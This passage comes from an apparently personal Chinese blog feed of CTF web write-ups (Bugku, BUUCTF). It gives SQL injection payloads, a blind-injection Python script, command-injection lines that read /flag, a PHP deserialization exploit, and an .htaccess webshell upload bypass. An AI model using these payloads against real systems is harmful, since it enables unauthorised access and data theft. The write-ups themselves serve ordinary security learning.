<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include_once</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;key&#x27;</span>])) &#123;</span><br><span class="line">    $key = $_GET[<span class="string">&#x27;key&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!is_numeric($key)) &#123;<span class="comment">//不能为字符串 只能输入数字，所以就想到十六进制</span></span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">&quot;Just num!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    $key = intval($key);</span><br><span class="line">    $str = <span class="string">&quot;123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>($key == $str) &#123;</span><br><span class="line">        <span class="keyword">echo</span> $flag;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Try to find out source file!&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>考察弱类型比较，数字和字符串比较时，遇到字符串会自动截断后面内容，只会进行前面数字的比较<br>例如123a和123就是相等的，但是a123和123就不等</p>
]]></content>
  </entry>
  <entry>
    <title>bugku4</title>
    <url>/2021/02/03/bugku4/</url>
    <content><![CDATA[<h2 id="web37"><a href="#web37" class="headerlink" title="web37"></a>web37</h2><p>先扫下后台，看有没有其他东西，发现没有，再登录窗口尝试手工注入也没有结果，再找找有没有其他提示吧:<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210203121356.png" alt="img"><br>收到的报文中有一个，把他拿去base64解码               <a id="more"></a></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$sql=<span class="string">&quot;SELECT username,password FROM admin WHERE username=&#x27;&quot;</span>.$username.<span class="string">&quot;&#x27;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>($row) &amp;&amp; $row[<span class="string">&#x27;password&#x27;</span>]===md5($password))&#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>从上面这里看来，闭合的手段是<code>.&quot;&#39;</code>:<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210203130640.png" alt="img" style="zoom:67%;"></p>
<p>根据下面的提示是password强==md5编码的password<br>===说明类型数值都要一样，那么如果让其相等呢，去查了一下，发现其实可以使用union联合语句<br>payload:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1.&quot;&#39;union select 1,&#39;e10adc3949ba59abbe56e057f20f883e&#39;#</span><br></pre></td></tr></table></figure>

<p>这里解释一下为什么，首先为什么说是知道字段数为2？——猜的一个个去试<br>然后这样写的原理是什么：<br>union select 1,’e…’被执行后的值为<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210203131103.png" alt="img"><br>那个row我是从数据库检索以后的结果，当执行了这个union select语句，row的值就会被赋予检索的password的值，然后此时就和我们输入的password的MD5的值是一致的了<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210203133143.png" alt="img" style="zoom:67%;"><br>进入到这个页面，联想到之前的命令执行，但是尝试了好多种都没返回有用的信息？是什么鬼</p>
<p>然后就去百度了，发现这里需要用时间盲注，因为输入1；sleep 5 页面是有延缓回显的，那么问题来了，接下来要干啥了，然后就去看了一下wp，发现，是要监听端口然后反弹shell的，这里就很无语了，因为监听了好久都没有反弹，用公网也不行，so就再去查了一下wp，发现是要写入文件然后查看。。。。。。。。<br>我吐了，这里写一下payload吧:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">123|ls..&#x2F;..&#x2F;..&#x2F;&gt;text</span><br></pre></td></tr></table></figure>

<p>上面是遍历目录，并将信息输出到text<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210204163721.png" alt="img" style="zoom:67%;"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">123|cat &#x2F;flag&gt;test</span><br></pre></td></tr></table></figure>

<p>将flag的信息输出到test中<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210204163909.png" alt="img" style="zoom:67%;"></p>
<h2 id="web38"><a href="#web38" class="headerlink" title="web38"></a>web38</h2><p>这一关是布尔盲注，根据我们的输入信息，有illegal character 、password wrong 、username don’t exit这几种情况，所以这里我们先用burpsuit 跑一下看哪些字符被过滤了发现 = 被过滤了 还有其他<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210205131958.png" alt="img" style="zoom:67%;"><br>但是盲注的所需要的命令倒是没怎么被过滤，但是最重要的=没了，要怎么办呢？，这个时候看到下面有人提示说用&lt;&gt;来代替，去查了一下:<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210205132203.png" alt="img" style="zoom:67%;"></p>
<h4 id="接下来构造注入语句"><a href="#接下来构造注入语句" class="headerlink" title="接下来构造注入语句"></a>接下来构造注入语句</h4><p>想起来之前刚学的使用减号进行连接并以此判断该值是否为真的方法，并且减号也没有被过滤<br>admin’-0-‘是password wrong<br>admin’-1-‘是username wrong</p>
<p>这里有个mid函数是可以用的，所以我们直接用前几天刚写的试试看</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url=<span class="string">&quot;http://114.67.246.176:10460/index.php&quot;</span></span><br><span class="line">s=requests.session()</span><br><span class="line">headers=&#123;<span class="string">&quot;Cookie&quot;</span>: <span class="string">&quot;PHPSESSID=34kfhvoilevqk4p779t36qc2j5&quot;</span>&#125;</span><br><span class="line">password = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">33</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="string">&#x27;0123456789abcdef&#x27;</span>:</span><br><span class="line">        payload =<span class="string">f&quot;admin&#x27;-(mid((password)from(-<span class="subst">&#123;i&#125;</span>))&lt;&gt;&#x27;<span class="subst">&#123;j&#125;</span><span class="subst">&#123;password&#125;</span>&#x27;)-&#x27;&quot;</span></span><br><span class="line"> <span class="comment">#这里的&lt;&gt;看到解释是不等为ture 布尔值为1，那么相等就是false，布尔值为0，所以和之前的脚本相比，只要吧下面的判断改一下就行了</span></span><br><span class="line">        print(payload)</span><br><span class="line">        data = &#123;<span class="string">&#x27;username&#x27;</span>: payload,<span class="string">&#x27;password&#x27;</span>: <span class="string">&#x27;sky&#x27;</span>&#125;</span><br><span class="line">       <span class="comment"># print(s.post(url,data=data).text)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;password error!&#x27;</span> <span class="keyword">in</span> s.post(url=url,data=data,headers=headers).text:</span><br><span class="line">            <span class="comment">#print(s.post(url,data=data).text)</span></span><br><span class="line">            strA = password</span><br><span class="line">            password = strA[::<span class="number">-1</span>]</span><br><span class="line">            print(password)<span class="comment">#可不用，是用来调试的</span></span><br><span class="line">            password += j</span><br><span class="line">            strA = password</span><br><span class="line">            password = strA[::<span class="number">-1</span>]</span><br><span class="line">            print(password)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<p>好的跑出来了<br><code>4dcc88f8f1bc05e7c2ad1a60288481a2</code></p>
<p>像是MD5，去解码一下，得到以下密码<br><code>bugkuctf</code>登录以后:flag{75ef5a74fee872de4e775bbbf2f01d22}就成功拿到flag 了</p>
<h3 id><a href="#" class="headerlink" title></a></h3>]]></content>
      <tags>
        <tag>bugku</tag>
      </tags>
  </entry>
  <entry>
    <title>buuctf4</title>
    <url>/2021/03/28/buuctf4/</url>
    <content><![CDATA[<h2 id="GXYCTF2019-BabySQli"><a href="#GXYCTF2019-BabySQli" class="headerlink" title="[GXYCTF2019]BabySQli"></a>[GXYCTF2019]BabySQli</h2><p>这题曾经遇到过，查看源码:<a id="more"></a></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>($arr[<span class="number">1</span>] == <span class="string">&quot;admin&quot;</span>)&#123;</span><br><span class="line">			<span class="keyword">if</span>(md5($password) == $arr[<span class="number">2</span>])&#123;</span><br><span class="line">				<span class="keyword">echo</span> $flag;</span><br><span class="line">			&#125;</span><br></pre></td></tr></table></figure>

<p>这里是关键，首先是账号等于admin，接下来是输入的密码等于查询到的密码，我们知道union联合查询如果是本来数据库当中没有的值 则会先新建一个，那么这里我们就利用这点，<br>paylaod:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">name&#x3D;-1&#39;union select 1,&#39;admin&#39;,&#39;e10adc3949ba59abbe56e057f20f883e&#39;#&amp;pw&#x3D;123456</span><br></pre></td></tr></table></figure>

<p>此时查询到的就是我们注入的这个admin里面的密码了</p>
<h2 id="网鼎杯-2020-青龙组-AreUSerialz"><a href="#网鼎杯-2020-青龙组-AreUSerialz" class="headerlink" title="[网鼎杯 2020 青龙组]AreUSerialz"></a>[网鼎杯 2020 青龙组]AreUSerialz</h2><p>这是一题反序列化的题，最近刚学完，趁热打铁做做</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> $op;</span><br><span class="line">    <span class="keyword">protected</span> $filename;</span><br><span class="line">    <span class="keyword">protected</span> $content;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        $op = <span class="string">&quot;1&quot;</span>;</span><br><span class="line">        $filename = <span class="string">&quot;/tmp/tmpfile&quot;</span>;</span><br><span class="line">        $content = <span class="string">&quot;Hello World!&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;process();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">process</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op == <span class="string">&quot;1&quot;</span>) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;write();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op == <span class="string">&quot;2&quot;</span>) &#123;</span><br><span class="line">            $res = <span class="keyword">$this</span>-&gt;read();</span><br><span class="line">            <span class="keyword">$this</span>-&gt;output($res);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;output(<span class="string">&quot;Bad Hacker!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;filename) &amp;&amp; <span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;content)) &#123;</span><br><span class="line">            <span class="keyword">if</span>(strlen((<span class="keyword">string</span>)<span class="keyword">$this</span>-&gt;content) &gt; <span class="number">100</span>) &#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;output(<span class="string">&quot;Too long!&quot;</span>);</span><br><span class="line">                <span class="keyword">die</span>();</span><br><span class="line">            &#125;</span><br><span class="line">            $res = file_put_contents(<span class="keyword">$this</span>-&gt;filename, <span class="keyword">$this</span>-&gt;content);</span><br><span class="line">            <span class="keyword">if</span>($res) <span class="keyword">$this</span>-&gt;output(<span class="string">&quot;Successful!&quot;</span>);</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">$this</span>-&gt;output(<span class="string">&quot;Failed!&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;output(<span class="string">&quot;Failed!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">read</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        $res = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;filename)) &#123;</span><br><span class="line">            $res = file_get_contents(<span class="keyword">$this</span>-&gt;filename);<span class="comment">//利用点在这</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> $res;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">output</span>(<span class="params">$s</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;[Result]: &lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> $s;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op === <span class="string">&quot;2&quot;</span>)</span><br><span class="line">            <span class="keyword">$this</span>-&gt;op = <span class="string">&quot;1&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;content = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;process();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_valid</span>(<span class="params">$s</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; strlen($s); $i++)</span><br><span class="line">        <span class="keyword">if</span>(!(ord($s[$i]) &gt;= <span class="number">32</span> &amp;&amp; ord($s[$i]) &lt;= <span class="number">125</span>))</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET&#123;<span class="string">&#x27;str&#x27;</span>&#125;)) &#123;</span><br><span class="line"></span><br><span class="line">    $str = (<span class="keyword">string</span>)$_GET[<span class="string">&#x27;str&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(is_valid($str)) &#123;</span><br><span class="line">        $obj = unserialize($str);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>1.在read()方法中看到一个file_get_contents()函数，所以接下来就看看如何靠拢<br>2.很明显。。。主要是op要为2即可进入read()当中</p>
<p>这里有个参数很奇怪，是个protect参数：这里需要我们学习一下protect属性的参数<br><strong>private类型在序列化的格式为:%00类名%00</strong><br>*<em>protected为:%00</em>%00变量**</p>
<h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $op = <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">public</span> $filename =<span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> $content=<span class="string">&quot;2&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">$a = <span class="keyword">new</span> FileHandler();</span><br><span class="line">$b = serialize($a);</span><br><span class="line"><span class="keyword">echo</span>($b);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><strong>考点1：</strong><br>在function中的__destruct使用强比较，比较op的值是否为2，所以此时我们需要绕过，由于比较的是“2”这是一个字符串，所以我们可以传入一个int类型的数据2，这样就可以绕过了。<br><strong>考点2：</strong><br>开头对于op，filename等变量的值的属性是protect，当我们打印出来以后，是 * 的如果我们直接复制粘贴到url中，这个是会被自动删除的，所以需要加个\00但是由于它那边有个is_valid的函数，所以这边就会过滤，改成其他师父们说%00，我也觉得按理说这个也是可以的，但是不知道为啥没有结果？所以感觉很奇怪<br>所以绕过点在这:<br>**在php7.1+对类属性的检测不严格，所以可以用public来绕过 **</p>
<h2 id="MRCTF2020-你传你🐎呢"><a href="#MRCTF2020-你传你🐎呢" class="headerlink" title="[MRCTF2020]你传你🐎呢"></a>[MRCTF2020]你传你🐎呢</h2><p>这个文件上传不会难<br>1.MIME类型更改为image/jpeg类型<br>2.上传一句话木马，后缀改为jpg<br>3.上传.htaccess：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SetHandler application&#x2F;x-httpd-php</span><br></pre></td></tr></table></figure>

<p>/var/www/html/upload/102a52cfbbd15e8c5b5f294d84090158/12 (2).jpg succesfully uploaded!<br>/var/www/html/upload/102a52cfbbd15e8c5b5f294d84090158/.htaccess succesfully uploaded!</p>
<p>获得以上路径<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210329223533.png" alt="img"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">flag&#123;1f5f9c64-a2c2-4f6d-96f2-a18df9744090&#125;</span><br></pre></td></tr></table></figure>

<h2 id="GYCTF2020-Blacklist"><a href="#GYCTF2020-Blacklist" class="headerlink" title="[GYCTF2020]Blacklist"></a>[GYCTF2020]Blacklist</h2><p>本题考查的依旧是堆叠注入:<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210329235245.png" alt="img"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">set @sql&#x3D;concat(&#39;s&#39;,&#39;elect &#96;flag&#96; from &#96;FLAGHere&#96;&#39;);PREPARE stmt1 FROM @sql;EXECUTE stmt1;</span><br><span class="line"></span><br><span class="line">1&#39;;PREPARE hacker from concat(char(115,101,108,101,99,116), &#39; * from &#96;FlagHere&#96; &#39;);EXECUTE hacker;#</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>由于过滤了很多 所以以上内容都用不了<br>这里查到了一种新方法:</p>
<h4 id="mysql查询语句-handler"><a href="#mysql查询语句-handler" class="headerlink" title="mysql查询语句-handler"></a>mysql查询语句-handler</h4><p> mysql除可使用select查询表中的数据，也可使用handler语句，这条语句使我们能够一行一行的浏览一个表中的数据，不过handler语句并不具备select语句的所有功能。它是mysql专用的语句，并没有包含到SQL标准中。<br>    HANDLER语句提供通往表的直接通道的存储引擎接口，可以用于MyISAM和InnoDB表。<br><strong>2 基本语法</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"> handler语句的语法如下：</span><br><span class="line">HANDLER tbl_name OPEN [ [AS] alias]</span><br><span class="line"></span><br><span class="line">HANDLER tbl_name READ index_name &#123; &#x3D; | &lt;&#x3D; | &gt;&#x3D; | &lt; | &gt; &#125; (value1,value2,...)</span><br><span class="line">    [ WHERE where_condition ] [LIMIT ... ]</span><br><span class="line">HANDLER tbl_name READ index_name &#123; FIRST | NEXT | PREV | LAST &#125;</span><br><span class="line">    [ WHERE where_condition ] [LIMIT ... ]</span><br><span class="line">HANDLER tbl_name READ &#123; FIRST | NEXT &#125;</span><br><span class="line">    [ WHERE where_condition ] [LIMIT ... ]</span><br><span class="line"></span><br><span class="line">HANDLER tbl_name CLOSE</span><br></pre></td></tr></table></figure>

<p>​    通过HANDLER tbl_name OPEN打开一张表，无返回结果，实际上我们在这里声明了一个名为tb1_name的句柄。<br>​    通过HANDLER tbl_name READ FIRST获取句柄的第一行，通过READ NEXT依次获取其它行。最后一行执行之后再执行NEXT会返回一个空的结果。<br>​    通过HANDLER tbl_name CLOSE来关闭打开的句柄。</p>
<p>通过索引去查看的话可以按照一定的顺序，获取表中的数据。<br>通过HANDLER tbl_name READ index_name FIRST，获取句柄第一行（索引最小的一行），NEXT获取下一行，PREV获取前一行，LAST获取最后一行（索引最大的一行）。</p>
<p>通过索引列指定一个值，可以指定从哪一行开始。<br>通过HANDLER tbl_name READ index_name = value，指定从哪一行开始，通过NEXT继续浏览。</p>
<p>如果我们不想浏览一个表的所有行，可以使用where和limit子句。</p>
<p>所以这里的payload:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0&#39;;use supersqli;handler FlagHere open;Handler FlagHere read first;</span><br></pre></td></tr></table></figure>

<p>参考:<a href="https://blog.csdn.net/JesseYoung/article/details/40785137">https://blog.csdn.net/JesseYoung/article/details/40785137</a></p>
<h2 id="MRCTF2020-Ez-bypass"><a href="#MRCTF2020-Ez-bypass" class="headerlink" title="[MRCTF2020]Ez_bypass"></a>[MRCTF2020]Ez_bypass</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line">$flag=<span class="string">&#x27;MRCTF&#123;xxxxxxxxxxxxxxxxxxxxxxxxx&#125;&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;gg&#x27;</span>])&amp;&amp;<span class="keyword">isset</span>($_GET[<span class="string">&#x27;id&#x27;</span>])) &#123;</span><br><span class="line">    $id=$_GET[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line">    $gg=$_GET[<span class="string">&#x27;gg&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (md5($id) === md5($gg) &amp;&amp; $id !== $gg) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;You got the first step&#x27;</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;passwd&#x27;</span>])) &#123;</span><br><span class="line">            $passwd=$_POST[<span class="string">&#x27;passwd&#x27;</span>];</span><br><span class="line">            <span class="keyword">if</span> (!is_numeric($passwd))</span><br><span class="line">            &#123;</span><br><span class="line">                 <span class="keyword">if</span>($passwd==<span class="number">1234567</span>)</span><br><span class="line">                 &#123;</span><br><span class="line">                     <span class="keyword">echo</span> <span class="string">&#x27;Good Job!&#x27;</span>;</span><br><span class="line">                     highlight_file(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line">                     <span class="keyword">die</span>(<span class="string">&#x27;By Retr_0&#x27;</span>);</span><br><span class="line">                 &#125;</span><br><span class="line">                 <span class="keyword">else</span></span><br><span class="line">                 &#123;</span><br><span class="line">                     <span class="keyword">echo</span> <span class="string">&quot;can you think twice??&quot;</span>;</span><br><span class="line">                 &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&#x27;You can not get it !&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;only one way to get the flag&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;You are not a real hacker!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Please input first&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;Please input first</span><br></pre></td></tr></table></figure>

<h2 id="强网杯-2019-高明的黑客"><a href="#强网杯-2019-高明的黑客" class="headerlink" title="[强网杯 2019]高明的黑客"></a>[强网杯 2019]高明的黑客</h2><p>还没遇到这种题，所以一开始看得眼花缭乱的<br>下载一个7-zip将<a href="http://www.tar.gz解压缩出来就行,解压缩出来以后看到很多代码/">www.tar.gz解压缩出来就行，解压缩出来以后看到很多代码</a><br>并且看到很多getshell的语句这里考查的就是编写脚本的能力:</p>
<p>这里贴一个大佬的python:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">print(<span class="string">&#x27;开始时间：  &#x27;</span>+  time.asctime( time.localtime(time.time()) ))</span><br><span class="line">s1=threading.Semaphore(<span class="number">100</span>)                                            <span class="comment">#这儿设置最大的线程数</span></span><br><span class="line">filePath = <span class="string">r&quot;D:/soft/phpstudy/PHPTutorial/WWW/src/&quot;</span></span><br><span class="line">os.chdir(filePath)                                                    <span class="comment">#改变当前的路径</span></span><br><span class="line">requests.adapters.DEFAULT_RETRIES = <span class="number">5</span>                                <span class="comment">#设置重连次数，防止线程数过高，断开连接</span></span><br><span class="line">files = os.listdir(filePath)</span><br><span class="line">session = requests.Session()</span><br><span class="line">session.keep_alive = <span class="literal">False</span>                                             <span class="comment"># 设置连接活跃状态为False</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_content</span>(<span class="params">file</span>):</span></span><br><span class="line">    s1.acquire()                                                </span><br><span class="line">    print(<span class="string">&#x27;trying   &#x27;</span>+file+ <span class="string">&#x27;     &#x27;</span>+ time.asctime( time.localtime(time.time()) ))</span><br><span class="line">    <span class="keyword">with</span> open(file,encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:                            <span class="comment">#打开php文件，提取所有的$_GET和$_POST的参数</span></span><br><span class="line">            gets = list(re.findall(<span class="string">&#x27;\$_GET\[\&#x27;(.*?)\&#x27;\]&#x27;</span>, f.read()))</span><br><span class="line">            posts = list(re.findall(<span class="string">&#x27;\$_POST\[\&#x27;(.*?)\&#x27;\]&#x27;</span>, f.read()))</span><br><span class="line">    data = &#123;&#125;                                                        <span class="comment">#所有的$_POST</span></span><br><span class="line">    params = &#123;&#125;                                                        <span class="comment">#所有的$_GET</span></span><br><span class="line">    <span class="keyword">for</span> m <span class="keyword">in</span> gets:</span><br><span class="line">        params[m] = <span class="string">&quot;echo &#x27;xxxxxx&#x27;;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> n <span class="keyword">in</span> posts:</span><br><span class="line">        data[n] = <span class="string">&quot;echo &#x27;xxxxxx&#x27;;&quot;</span></span><br><span class="line">    url = <span class="string">&#x27;http://127.0.0.1/src/&#x27;</span>+file</span><br><span class="line">    req = session.post(url, data=data, params=params)            <span class="comment">#一次性请求所有的GET和POST</span></span><br><span class="line">    req.close()                                                <span class="comment"># 关闭请求  释放内存</span></span><br><span class="line">    req.encoding = <span class="string">&#x27;utf-8&#x27;</span></span><br><span class="line">    content = req.text</span><br><span class="line">    <span class="comment">#print(content)</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;xxxxxx&quot;</span> <span class="keyword">in</span> content:                                    <span class="comment">#如果发现有可以利用的参数，继续筛选出具体的参数</span></span><br><span class="line">        flag = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> a <span class="keyword">in</span> gets:</span><br><span class="line">            req = session.get(url+<span class="string">&#x27;?%s=&#x27;</span>%a+<span class="string">&quot;echo &#x27;xxxxxx&#x27;;&quot;</span>)</span><br><span class="line">            content = req.text</span><br><span class="line">            req.close()                                                <span class="comment"># 关闭请求  释放内存</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;xxxxxx&quot;</span> <span class="keyword">in</span> content:</span><br><span class="line">                flag = <span class="number">1</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> flag != <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">for</span> b <span class="keyword">in</span> posts:</span><br><span class="line">                req = session.post(url, data=&#123;b:<span class="string">&quot;echo &#x27;xxxxxx&#x27;;&quot;</span>&#125;)</span><br><span class="line">                content = req.text</span><br><span class="line">                req.close()                                                <span class="comment"># 关闭请求  释放内存</span></span><br><span class="line">                <span class="keyword">if</span> <span class="string">&quot;xxxxxx&quot;</span> <span class="keyword">in</span> content:</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> flag == <span class="number">1</span>:                                                    <span class="comment">#flag用来判断参数是GET还是POST，如果是GET，flag==1，则b未定义；如果是POST，flag为0，</span></span><br><span class="line">            param = a</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            param = b</span><br><span class="line">        print(<span class="string">&#x27;找到了利用文件： &#x27;</span>+file+<span class="string">&quot;  and 找到了利用的参数：%s&quot;</span> %param)</span><br><span class="line">        print(<span class="string">&#x27;结束时间：  &#x27;</span> + time.asctime(time.localtime(time.time())))</span><br><span class="line">    s1.release()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> files:                                                            <span class="comment">#加入多线程</span></span><br><span class="line">   t = threading.Thread(target=get_content, args=(i,))</span><br><span class="line">   t.start()</span><br></pre></td></tr></table></figure>

<p>作为一个菜鸡，我觉得从最简单的开始写起,希望能学到点东西:</p>
